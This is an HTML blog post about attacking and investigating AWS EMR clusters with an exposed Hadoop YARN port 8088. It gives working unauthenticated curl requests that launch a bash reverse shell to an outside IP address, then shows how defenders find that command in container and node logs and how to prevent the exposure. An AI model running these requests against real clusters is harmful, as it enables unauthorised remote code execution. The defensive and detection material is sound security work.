@@ -1,0 +1,241 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-133811886-2');
+  </script>
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <script src="../static/js/nav.js"></script>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+  <link rel="stylesheet" href="../static/css/main.css">
+</head>
+<body>
+
+    <div class="site-wrapper">
+        <div class="sticky top-bar">
+      <div id="mySidenav" class="sidenav sticky" include-nav="/static/nav.html">
+        </div>
+        <span class="sticky hamburger" style="font-size:30px;cursor:pointer" onclick="openNav()">&#9776;</span>
+    </div>
+        <div class="container">
+            <div class="blog-header">
+                <h1 class="blog-title" id="top">EMR Security Woes</h1>
+                <hr>
+              </div>
+        
+              <div class="row">
+        
+                <div class="col-sm-8 blog-main">
+                    <div class="blog-post" data-spy="scroll" data-target="#sidebar" data-offset="15">
+                        <p>I recently had the opportunity to dig deeper into the Elastic Map Reduce (EMR) service in AWS. According to the official Amazon docs (<a href="https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-what-is-emr.html">here</a>) "...EMR is a manged cluster platform that simlifies running big data frameworks..." Full disclosure I have virtually zero experience with big data and big data platforms. The closest I've gotten to that space is storing data in S3 and searching it with Athena. Oh, I also sometimes search enterprise Splunk without specifying an index or sourcetype. That counts right?</p>
+                        <p>The reason I was digging into EMR was not to learn more about big data, hadoop, spark, etc. But instead it was to answer a few simple questions. How would someone compromise a cluster, and on the flip side, how could you detect it was compromised and what the attackers did after compromise.</p>
+                        <hr />
+                        <h3 id="setup">Setting Up a Cluster</h3>
+                        <p>Amazon has done an amazing job at making it really easy to deploy an EMR cluster. In fact its just a few clicks and its up. Within the EMR section select <code>create</code> to create a cluster. Once the <code>Create Cluster - Quick Options</code> page loads configure your cluster to meet your needs. For this example select release emr-6.0.0 with Spark, Yarn, and Zeppelin.</p>
+                        <p>Select the key pair to use for the instances which will be part of the cluster, and then click the <code>Create Cluster</code> button. A screenshot of the configuration setup is below.</p>
+
+                        <img src="../static/images/AWS/emr_security_woes/create_cluster.png" alt="create_cluster" class="img-fluid">
+
+                        <p>The instances will spin up fairly quickly, the cluster will become fully operational in about 3-5 minutes. Once it's ready the cluster status will be <code>Waiting, Cluster Ready</code> the green dot next to the cluster name will be solid green as pictured below</p>
+
+                        <img src="../static/images/AWS/emr_security_woes/cluster_ready.png" alt="cluster_ready" class="img-fluid">
+                        
+                        <p>In order to access the cluster make sure to add a security group to the primary node which gives access to 8088. <b>DO NOT EXPOSE THIS TO THE ENTIRE INTERNET</b>. I cannot stress this enough, do not expose the port to entire Internet, only allow access from a trusted IP.</p>
+
+                        <hr />
+                        <h3 id="compromise">Compromising EMR</h3>
+                        <p>As it turns out with improper security configurations an EMR deployment can be compromised with a couple of curl requests or a quick python script.</p>
+                        <p>The first request we need to make constructs a new application for us, and returns various meta details about the applicaiton.</p>
+
+                        <pre><code>
+                            curl --request POST 'PRIMARYHOST:8088/ws/v1/cluster/apps/new-applicaion'
+                        </code></pre>
+                        <p>If successful we get a response similar to the one below: </p>
+                        <pre><code>
+                            {<br />
+                            &emsp;<span style="color:red">"application-id": "application_1590702911576_0016",</span><br />
+                            &emsp;"maximum-resource-capability": {<br />
+                            &emsp;&emsp;"memory": 12288,<br />
+                            &emsp;&emsp;"vCores": 4,<br />
+                            &emsp;&emsp;"resourceInformations": {<br />
+                            &emsp;&emsp;&emsp;"resourceInformation": [<br />
+                            &emsp;&emsp;&emsp;&emsp;{<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"maximumAllocation": 9223372036854775807,<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"minimumAllocation": 0,<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"name": "memory-mb",<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"resourceType": "COUNTABLE",<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"units": "Mi",<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"value": 12288<br />
+                            &emsp;&emsp;&emsp;&emsp;},<br />
+                            &emsp;&emsp;&emsp;&emsp;{<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"maximumAllocation": 9223372036854775807,<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"minimumAllocation": 0,<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"name": "vcores",<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"resourceType": "COUNTABLE",<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"units": "",<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"value": 4<br />
+                            &emsp;&emsp;&emsp;&emsp;}<br />
+                            &emsp;&emsp;&emsp;]<br />
+                            &emsp;&emsp;}<br />
+                            &emsp;}<br />
+                            }
+                        </code></pre>
+
+                        <p>The main field we care about is the application-id field. The resource information is also important. We need to make sure that we do not request resources beyond the capacity of the resources allocted for the applications.</p>
+                        <p>The next step is to execute the application. Within an exection request, we define additional parameters for the job. There are all kinds of configuration options such as resources to consume, commands to run, and a lot of other things that are well beyond the scope of this article. The POST request below will call our application and have it run a simple reverse shell:</p>
+                        <pre><code>
+                            curl --request POST 'PRIMARYHOST:8088/ws/v1/cluster/apps' \ <br />
+                            --header 'Accept: application/json' \ <br />
+                            --header 'Content-Type: application/json' \ <br />
+                            --data-raw '{<br />
+                                &emsp;"max-app-attempts":2,<br />
+                                &emsp;"am-container-sepc":{<br />
+                                &emsp;&emsp;"commands":{<br />
+                                &emsp;&emsp;&emsp;<span style="color:red">"command":"/bin/bash -c "bash -i >& /dev/tcp/3.94.211.164/6767 0>&1""</span><br />
+                                &emsp;&emsp; }<br />
+                                &emsp;},<br />
+                                &emsp;<span style="color:red">"application-id":"application_1590702911576_0016",</span><br />
+                                &emsp;"application-type":"YARN",<br />
+                                &emsp; "application-anem":"yupyup"<br />
+                            }'
+                        </code></pre>
+                        <p>Once the curl request is made to run the application we can expect a 202 response with no data. A 202 response means the application run request was submitted successfully. It DOES NOT mean the application ran successfully. If there are any configuration errors or other errors the response is still going to be a 202. Just because the applicaiton was submitted successfully does not mean that it will be processed and executed succesfully.</p>
+
+                        <p>In the web GUI at <code>http://PRIMARYHOST:8088/cluster</code> we see that the application ID we called to run will now have an execution history. The user will be <code>dr.who</code> because we created and called the application without authenticating. The other columns have details about various things such as the start times, launch times, etc. Even though the 'State' and 'FinalStatus' columns may say failed the shell code within the application was probably ran.
+                        
+                        <img src="../static/images/AWS/emr_security_woes/application_run.png" alt="application_run" class="img-fluid"></p> 
+                        
+                        <h3 id="logging">Logging</h3>
+
+                        <p>As an attacker we can confirm if this worked by checking to see if we have a shell from one of the nodes within the cluster, but how can we as defenders tell if the execution was successful? Good news, all of the activity aobve is logged. By digging into the logs a bit we should be able to tell what commands were executed and where they were executed at.</p>
+                        <p>When we setup the cluster we enabled logging to a S3 folder. All of our applications will log to this folder. If everything was left to the defaults the logging folder will be something similar to this: <code>s3://aws-logs-ACCOUNT-us-east-1/elasticmapreduce/CLUSTER ID</code>. Within this folder we can pull container logs out for each application. They'll be in a subfolder similar to this <code>/containers/application_1590702911576_0016/container_1590702911576_0016_02_000001/launch_container.sh.gz</code></p>
+
+                        <p>The launch_container.sh log will have exection details for the application when it was called. In the log output below we can see that the last line contains the reverse shell code that we included in the POST request above when we ran our malicious applicaiton.</p>
+
+    
+                        <pre><code>
+                            ...<br /><br />
+                            # Creating copy of launch script<br /><br />
+                            cp "launch_container.sh" "/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh"<br /><br />
+                            chmod 640 "/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh"<br /><br />
+                            # Determining directory contents<br /><br />
+                            echo "ls -l:" 1>"/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info"<br /><br />
+                            ls -l 1>>"/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info"<br /><br />
+                            echo "find -L . -maxdepth 5 -ls:" 1>>"/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info"<br /><br />
+                            find -L . -maxdepth 5 -ls 1>>"/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info"<br /><br />
+                            echo "broken symlinks(find -L . -maxdepth 5 -type l -ls):" 1>>"/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info"<br /><br />
+                            find -L . -maxdepth 5 -type l -ls 1>>"/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info"<br /><br />
+                            echo "Launching container"<br /><br />
+                            <span style="color:red">exec /bin/bash -c "bash -i >& /dev/tcp/3.94.211.164/6767 0>&1"</span><br />
+                        </code></pre>
+
+                        <p>At this point we know what was ran, but we don't know which node the malicious code was executed. This is going to be critical to discover so that we can conduct further analysis of the system to see what else the attacker did. To do this we need to change to a new directory within S3 to find the node logs. Node logs can be found here: <code>node/NODE INSTANCE ID/applications/hadoop-yarn</code></p>
+                        <p>These logs are local logs for each instance in the cluster and show all of the application submissions. A sample output is below.</p>
+
+                        <pre><code>
+                            <ol>
+                                <li>2020-06-20 20:09:04,277 INFO SecurityLogger.org.apache.hadoop.ipc.Server (Socket Reader #1 for port 8041): Auth successful for appattempt_1590702911576_0016_000001 (auth:SIMPLE)</li><br />
+                                <li>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl (IPC Server handler 32 on default port 8041): Start request for container_1590702911576_0016_01_000001 by user dr.who</li><br />
+                                <li>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl (IPC Server handler 32 on default port 8041): Creating a new application reference for app application_1590702911576_0016</li><br />
+                                <li>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl (NM ContainerManager dispatcher): Application application_1590702911576_0016 transitioned from NEW to INITING</li><br />
+                                <li>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.NMAuditLogger (IPC Server handler 32 on default port 8041): <span style="color:red">USER=dr.who	IP=172.31.18.33	OPERATION=Start Container Request	TARGET=ContainerManageImpl	RESULT=SUCCESS	APPID=application_1590702911576_0016	CONTAINERID=container_1590702911576_0016_01_000001</span></li><br />
+                                <li>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl (NM ContainerManager dispatcher): Adding container_1590702911576_0016_01_000001 to application application_1590702911576_0016</li><br />
+                                <li>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl (NM ContainerManager dispatcher): Application application_1590702911576_0016 transitioned from INITING to RUNNING</li><br />
+                                <li>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl (NM ContainerManager dispatcher): Container container_1590702911576_0016_01_000001 transitioned from NEW to SCHEDULED</li><br />
+                                <li>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.AuxServices (NM ContainerManager dispatcher): Got event CONTAINER_INIT for appId application_1590702911576_0016</li><br />
+                                <li>2020-06-20 20:09:04,292 INFO org.apache.spark.network.yarn.YarnShuffleService (NM ContainerManager dispatcher): Initializing container container_1590702911576_0016_01_000001</li><br />
+                                <li>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.scheduler.ContainerScheduler (NM ContainerManager dispatcher): Starting container [container_1590702911576_0016_01_000001]</li><br />
+                                <li>2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl (NM ContainerManager dispatcher): Container container_1590702911576_0016_01_000001 transitioned from SCHEDULED to RUNNING</li><br />
+                                <li>2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl (NM ContainerManager dispatcher): Starting resource-monitoring for container_1590702911576_0016_01_000001</li><br />
+                                <li>2020-06-20 20:09:05,867 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl (Container Monitor): container_1590702911576_0016_01_000001's ip = 172.31.22.26, and <span style="color:red">hostname = ip-172-31-22-26.ec2.internal</span></li><br />
+                                <li>2020-06-20 20:09:05,873 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl (Container Monitor): Skipping monitoring container container_1590702911576_0016_01_000001 since CPU usage is not yet available.</li><br />
+                                <li>2020-06-20 20:09:35,593 ERROR org.apache.hadoop.yarn.server.nodemanager.NodeStatusUpdaterImpl (Node Status Updater): NM node labels {<CORE:exclusivity=true>} were not accepted by RM and message from RM : null</li><br />
+                            </ol>
+                        </code></pre>
+
+                        <p>On line 5 in the logs above we can see that the anonymous user 'dr.who' requested to start a container, the application ID, and the container ID for the particular request. On line 14 we can see the node within our cluster which ran the malicious application.</p>
+
+                        <p>Additional logs can be found on the nodes themselves. Another way we can see activity is by pulling the <code>hadoop-yarn-resourcemanager</code> logs out of the primary server.</p>
+
+                        <p>Within this log source we can see lines similar to the one below that show the resourcemanager assigning our malicious container work to the 172.31.22.26 host. This is a great way to determine which host(s) the malicious activity occured on.</p>
+                        <pre><code>2020-06-20 20:09:04,269 INFO org.apache.hadoop.yarn.server.resourcemanager.scheduler.common.fica.FiCaSchedulerNode (SchedulerEventDispatcher:Event Processor): Assigned container <span style="color:red">container_1590702911576_0016_01_000001</span> of capacity memory:32, vCores:1 on <span style="color:red">host ip-172-31-22-26.ec2.internal:8041</span>, which has 1 containers, memory:32, vCores:1 used and memory:12256, vCores:3 available after allocation</code></pre>
+
+                        <p>Other helpful information can be pulled from this log source. The following log entry shows the initial application creation request:
+                            <pre><code>2020-06-20 20:09:04,216 INFO org.apache.hadoop.yarn.server.resourcemanager.RMAuditLogger (qtp677217562-27): USER=dr.who	OPERATION=Submit Application Request	TARGET=ClientRMService	RESULT=SUCCESS	APPID=application_1590702911576_0016	QUEUENAME=default</code></pre>
+                        </p>
+                        <p>Combining several other log entries from this file will show the entire lifecyle of the application. This is very helpful when attempting to pull together a detailed timeline of all the events.</p>
+
+                        <h3 id="next">Next Steps</h3>
+                        <p>Now that we have a general understanding of what occured, and where it occured we have to begin digging into the activity that occured on the node which spawned the reverse shell. If there are hundreds of application run requests they will all have to be examined. Without an understanding of each request it's hard to say exactly what occured or which nodes were potentially compromised. </p>
+
+                        <h3 id="prevention">Prevention</h3>
+                        <p>Preventing this behavior is straight forward, do not expose EMR clusters to the Internet. Thats it. Make sure the security groups associated with each node in the cluster are scoped to the minium access required to manage and maintain the systems. There is even a GuardDuty alert <a href="https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_recon.html#PortProbeEMRUnprotectedPort">Port Probe EMR Unprotected Port</a>. That will fire if someone scans a sensitive port (8088).</p>
+
+
+                        <h3 id="additional">Additional Resources</h3>
+
+
+                        <p>
+                            Additional references, I leaned on these heavily while trying to better understand this space:
+                            <ul>
+                                <li><a href="https://blog.radware.com/security/2018/11/hadoop-yarn-an-assessment-of-the-attack-surface-and-its-exploits/">Hadoop YARN: An Assessment of the Attack Surface and Its Exploits</a></li>
+                                <li><a href="https://medium.com/@ivan.vasquez/dont-let-dr-who-hijack-your-emr-cluster-9bb67daa4641">Don't let Dr.Who hijack your EMR cluster</a></li>
+                                <li><a href="https://medium.com/@neerajsabharwal/hadoop-yarn-hack-9a72cc1328b6">Hadoop Yarn hack?</a></li>
+                            </ul>
+                        </p>
+
+                    </div><!-- /.blog-post -->
+                </div><!-- /.blog-main -->
+
+                    <!-- Blog Side Bar-->
+                <div class="col-md-3" id=sidebar data-spy="affix-bottom" data-offset-top="0">
+
+                    <nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id="post-nav">
+                        <h5>contents</h5>
+                        <ul class="nav post-sidenav"> 
+                            <li class=""> <a href="#setup">Setting up a Cluster</a> </li>
+                            <li class=""> <a href="#compromise">Compromising EMR</a> </li>
+                            <li class=""> <a href="#logging">Logging</a> </li>
+                            <li class=""> <a href="#next">Next Steps</a> </li>
+                            <li class=""> <a href="#prevention">Prevention</a> </li>
+                            <li class=""> <a href="#additional">Additional Resources</a></li>
+                            <li class=""> <a href="#top">Top</a> </li>
+                    </nav>
+                </div><!-- /.blog-sidebar -->
+
+            </div><!-- /.row -->
+        </div> <!--/.container-->
+    </div> <!--/.wrapper -->
+
+<!-- Modals -->
+<div class="modal fade" id="redressing1Modal" tabindex="-1" role="dialog" aria-labelledby="redressing1ModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+        <img src="../static/images/xssuiredressing1.png" style="width:300%;align-self:center;">
+    </div>
+  </div>
+</div>
+<div class="modal fade" id="redressing2Modal" tabindex="-1" role="dialog" aria-labelledby="redressing2ModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+        <img src="../static/images/xssuiredressing2.png" style="width:300%;align-self:center;">
+    </div>
+  </div>
+</div>
+
+
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<script>includeHTML();</script>
+</html> 
+
